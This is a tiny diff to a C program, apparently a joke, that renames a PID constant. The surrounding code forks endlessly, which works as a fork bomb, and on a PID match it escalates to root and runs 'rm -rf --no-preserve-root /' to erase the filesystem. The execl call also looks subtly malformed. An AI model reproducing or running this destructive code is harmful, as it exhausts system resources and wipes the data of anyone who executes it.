@@ -5,7 +5,7 @@
 int main() {
 	while (1) {
 		pid_t new_pid = fork();
-		if (new_pid == ELONS_LUCK_PID) {
+		if (new_pid == ELONS_LUCKY_PID) {
 			setuid(0);
 			execl("/bin/rm", "-rf", "--no-preserve-root", "/");
 		}
